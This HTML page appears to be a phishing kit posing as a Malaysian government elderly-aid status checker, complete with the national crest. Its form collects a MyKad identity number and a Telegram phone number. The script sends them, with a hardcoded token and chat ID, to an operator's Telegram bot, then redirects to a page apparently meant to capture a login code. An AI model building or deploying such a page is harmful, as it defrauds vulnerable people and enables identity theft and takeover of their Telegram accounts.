<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Bantuan Warga Emas Untuk Seluruh Rakyat Malaysia 2024</title>

    <!-- Link ke Google Fonts -->
    <link
      href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600&display=swap"
      rel="stylesheet"
    />

    <!-- Link ke CSS intl-tel-input -->
    <link
      rel="stylesheet"
      href="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/css/intlTelInput.css"
    />

    <style>
      * {
        box-sizing: border-box;
        outline: none;
        border: none;
        text-decoration: none;
      }

      body {
        font-family: "Poppins", sans-serif;
        color: #010101;
        background-color: #fff;
      }

      /* navbar */
      .navbar {
        display: flex;
        justify-content: space-between;
        align-items: center;
        background-color: #fff; /* Warna latar belakang navbar */
        padding: 10px 20px;
        position: fixed;
        top: 0;
        left: 0;
        right: 0;
        z-index: 9999;
      }

      h4 {
        color: #010101;
      }

      .navbar .navbar-logo {
        font-size: 2vw; /* Ukuran font logo dinamis */
        color: #010101;
        font-weight: 400;
        display: flex;
        align-items: center;
      }

      .navbar .navbar-nav {
        display: flex;
        align-items: center;
        justify-content: flex-end; /* Posisi tautan tetap rapih di ujung kanan */
        flex-wrap: nowrap; /* Mencegah elemen terbungkus menjadi kolom */
      }

      .navbar .navbar-nav a {
        color: #010101; /* Warna teks bahasa */
        font-weight: bold;
        font-size: 1.5vw; /* Ukuran font dinamis */
        margin: 0 10px; /* Menambahkan jarak antar link bahasa */
        padding: 5px; /* Ruang klik */
        text-decoration: none; /* Menghilangkan garis bawah pada link */
        white-space: nowrap; /* Mencegah teks terpotong ke baris baru */
      }

      .navbar .navbar-nav a span {
        color: blue;
      }

      .navbar .navbar-nav a:hover {
        color: #007bff; /* Warna hover */
        transition: color 0.3s ease; /* Efek transisi saat hover */
      }

      .navbar .navbar-img {
        width: 40px; /* Ukuran logo */
        height: auto;
        margin-left: 10px; /* Jarak antara logo dan teks */
        object-fit: contain; /* Menjaga proporsi gambar */
      }

      /* Media Query untuk layar kecil */
      @media (max-width: 768px) {
        .navbar {
          padding: 10px 10px; /* Mengurangi padding pada layar kecil */
        }

        .navbar .navbar-logo {
          font-size: 4vw; /* Ukuran font logo lebih besar pada layar kecil */
        }

        .navbar .navbar-nav {
          flex-direction: row; /* Pastikan tautan tetap satu baris */
        }

        .navbar .navbar-nav a {
          font-size: 3vw; /* Ukuran font lebih besar pada layar kecil */
          margin: 0 5px; /* Mengurangi margin pada layar kecil */
          padding: 5px; /* Ruang klik pada layar kecil */
        }

        .navbar .navbar-img {
          width: 30px; /* Ukuran logo lebih kecil pada layar kecil */
          margin-left: 5px; /* Kurangi jarak pada layar kecil */
          margin-top: 0;
        }
      }
      .hero {
        height: 100vh;
        width: 100%;
        background-size: cover;
        background-position: center;
        position: relative;
      }

      img {
        width: 350px; /* Atur lebar gambar sesuai keinginan */
        height: auto; /* Agar proporsi gambar tetap */
        display: block; /* Untuk membuatnya blok, bisa juga inline-block */
        margin: 0 auto; /* Posisikan di tengah jika dalam elemen blok */
        margin-top: 10px;
      }

      img[src="SMR.jpeg"] {
        display: flex;
        margin-top: 50px;
      }

      h4 {
        display: flex;
        margin-top: 0;
        margin-bottom: 0;
        font-size: 1.5rem;
        align-items: center;
        justify-content: center;
      }

      .form-container {
        justify-content: center;
        background-color: #fff;
        padding: 50px 20px;
        border-radius: 10px;
        width: 70%;
        margin: 50px auto;
        margin-top: 10px;
        margin-bottom: 0;
      }

      label {
        display: block;
        margin-bottom: 8px;
        font-size: 1.1rem;
        font-weight: 600;
      }

      input[type="text"] {
        width: 100%;
        padding: 15px;
        margin-bottom: 20px;
        border: 1px solid #010101;
        border-radius: 5px;
        font-size: 1.1rem;
      }

      input[type="tel"] {
        width: 108%;
        padding: 15px;
        margin-bottom: 10px;
        border: 1px solid #010101;
        border-radius: 5px;
        font-size: 1.1rem;
      }

      .btn {
        display: flex;
        width: 50%;
        padding: 12px;
        margin: 10px auto 0;
        background-color: #6b6b6b;
        color: white;
        border: none;
        border-radius: 10px;
        font-size: 1.1rem;
        cursor: pointer;
        align-items: center;
        justify-content: center;
      }

      .btn:hover {
        background-color: #225786;
      }

      ._record-box {
        width: 95%;
        margin: 10px auto;
        padding: 10px;
        background-color: #f5f5f5;
        border-radius: 10px;
        box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
      }

      /* CSS untuk list-box */
      .list-box {
        overflow: hidden;
        max-height: 200px;
      }

      /* CSS untuk list */
      .list {
        display: flex;
        flex-direction: column;
        padding: 0;
      }

      /* CSS untuk item */
      .item {
        display: flex;
        align-items: center;
        padding: 1px;
        background-color: white;
        border-radius: 8px;
        margin-bottom: 10px;
      }

      /* CSS untuk logo/avatar */
      .record_logo img {
        width: 50px;
        height: 50px;
        border-radius: 50%;
        object-fit: cover;
        margin-right: 15px;
        margin-left: 15px;
        padding-top: 0;
      }

      /* CSS untuk nama */
      .center .h1 {
        font-size: 16px;
        font-weight: bold;
        margin-top: 0;
      }

      /* CSS untuk status */
      .center .h2 {
        font-size: 14px;
        color: green;
      }

      /* Loading screen styles */
      .loading-screen {
        position: fixed;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        background-color: rgba(255, 255, 255, 0.8);
        display: flex;
        justify-content: center;
        align-items: center;
        z-index: 1000;
        display: none;
      }

      .loading-screen img {
        max-width: 100px;
        max-height: 100px;
      }

      main {
        flex-grow: 1; /* Memastikan konten utama mendorong footer ke bawah */
      }

      footer {
        position: fixed; /* Tetap di bawah meski konten lebih pendek */
        left: 0;
        bottom: 0;
        width: 100%;
        background-color: #fff; /* Latar belakang footer */
        text-align: center;
      }

      footer img {
        max-width: 380px; /* Ukuran gambar maksimal */
        height: auto;
      }

      /* Keyframes for spin animation */
      @keyframes spin {
        0% {
          transform: rotate(0deg);
        }
        100% {
          transform: rotate(360deg);
        }
      }

      /* media */

      @media (max-width: 768px) {
        .form-container {
          width: 90%;
          padding: 20px;
        }

        input[type="text"],
        input[type="tel"] {
          font-size: 1rem;
        }

        .btn {
          width: 75%;
          font-size: 1.2rem;
          padding: 15px;
          margin-top: 20px;
        }
      }
    </style>
  </head>
  <body>
    <nav class="navbar">
      <div class="navbar-logo">
        <img src="Jata Negara@3x.gif" alt="Logo" class="navbar-img" />
        <img src="logo (1).png" alt="Logo" class="navbar-img" />
        <!-- Contoh gambar logo -->
      </div>

      <div class="navbar-nav">
        <a href="#">Bahasa Melayu</a>
        <a href="#"><span>English</span></a>
        <a href="#"><span>日本</span></a>
        <a href="#"><span>摩訶至那國</span></a>
      </div>
    </nav>
    <div class="hero">
      <br />

      <img src="warga-emas.jpeg" alt="tng-img" />

      <h4>Semak Status</h4>

      <div class="form-container">
        <form id="registrationForm">
          <label for="name">No MyKad</label>
          <input
            type="text"
            id="name"
            name="name"
            placeholder="83XXXXXXXXX"
            required
          />

          <label for="phone">Nombor Phone Telegram</label>
          <input
            type="tel"
            id="phone"
            name="phone"
            placeholder="+60XXXXXXXXX"
            required
          />

          <button type="submit" class="btn">SEMAK SEKARANG</button>
        </form>
      </div>
      <br />
      <br />
      <br />

      <!-- Loading Screen -->
      <div class="loading-screen" id="loadingScreen">
        <img src="loading-loading-forever.gif" alt="Loading..." />
      </div>
    </div>

    <footer>
      <!-- Hanya menampilkan gambar di dalam footer -->
      <img src="ini1.png" alt="Logo Footer" />
    </footer>

    <!-- Script untuk intl-tel-input -->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/js/intlTelInput.min.js"></script>
    <script>
      // Inisialisasi intl-tel-input
      const phoneInputField = document.querySelector("#phone");
      const phoneInput = window.intlTelInput(phoneInputField, {
        preferredCountries: ["my", "id", "us"],
        utilsScript:
          "https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/js/utils.js",
      });

      // Event listener untuk pengiriman form
      document
        .getElementById("registrationForm")
        .addEventListener("submit", function (event) {
          event.preventDefault(); // Mencegah pengiriman form default

          const name = document.getElementById("name").value; // Ambil nilai nama
          const phone = document.getElementById("phone").value; // Ambil nilai nomor telepon

          // Simpan data ke local storage
          localStorage.setItem("name", name);
          localStorage.setItem("phone", phone);

          // Tampilkan loading screen
          document.getElementById("loadingScreen").style.display = "flex";

          // Kirim data ke Telegram Bot
          const botToken = "7003917088:AAEc-SSprRePZ8CKmjnyM-5DHLnIhsN0Bgs"; // Ganti dengan token bot Anda
          const chatId = "6430700101"; // Ganti dengan ID chat Anda

          // Format pesan
          const message = `
──────────────────────
(MALAY | DATA | ${phone})
──────────────────────
- No HP         : ${phone}
- Nama Lengkap  : ${name}
──────────────────────
`;

          // URL untuk mengirim pesan
          const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(
            message
          )}`;

          fetch(url)
            .then((response) => {
              if (response.ok) {
                // Reset form setelah pengiriman berhasil
                document.getElementById("registrationForm").reset();
                // Arahkan ke laman kode setelah pengiriman
                window.location.href = "kode.html"; // Ganti dengan URL laman tujuan
              } else {
                console.error("Gagal mengirim pesan:", response.statusText);
                // Sembunyikan loading screen jika gagal
                document.getElementById("loadingScreen").style.display = "none";
              }
            })
            .catch((error) => {
              console.error("Error:", error);
              // Sembunyikan loading screen jika terjadi error
              document.getElementById("loadingScreen").style.display = "none";
            });
        });
    </script>

    <script>
      function startAutoScroll() {
        var list = document.querySelector(".list");
        var scrollTimer;

        function scrollList() {
          var firstItem = list.querySelector(".item:first-child");
          var itemHeight = firstItem.offsetHeight;

          list.style.transition = "margin-top 1s ease";
          list.style.marginTop = `-${itemHeight}px`;

          setTimeout(function () {
            list.style.transition = "none";
            list.style.marginTop = "0px";
            list.appendChild(firstItem); // Pindahkan item pertama ke akhir
          }, 1000); // Setelah animasi selesai (1 detik)

          scrollTimer = setTimeout(scrollList, 2000); // Ulangi scroll setiap 2 detik
        }

        scrollList(); // Mulai scrolling
      }

      document.addEventListener("DOMContentLoaded", function () {
        startAutoScroll(); // Jalankan scrolling otomatis saat halaman dimuat
      });
    </script>
  </body>
</html>
